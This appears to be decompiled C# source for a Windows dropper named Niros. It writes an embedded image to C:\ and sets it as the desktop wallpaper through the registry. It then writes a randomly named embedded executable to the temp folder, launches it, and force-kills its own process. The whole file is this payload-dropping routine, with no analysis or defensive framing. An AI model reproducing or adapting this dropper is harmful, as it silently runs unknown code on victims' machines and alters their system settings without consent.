using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using Niros.Properties;

namespace Niros;

internal class Program
{
	private static void Main(string[] args)
	{
		string text = "C:\\";
		File.WriteAllBytes(text + "wp.bmp", Resources.wp);
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey.SetValue("Wallpaper", "C:\\wp.bmp", RegistryValueKind.String);
		string tempPath = Path.GetTempPath();
		File.WriteAllBytes(tempPath + "NAfkpCRChMSbiBGLROsEJOuAodIntR.exe", Resources.NAfkpCRChMSbiBGLROsEJOuAodIntR);
		ProcessStartInfo startInfo = new ProcessStartInfo(tempPath + "NAfkpCRChMSbiBGLROsEJOuAodIntR.exe");
		Process.Start(startInfo);
		Process.Start("taskkill", "/f /im Niros.exe");
	}
}
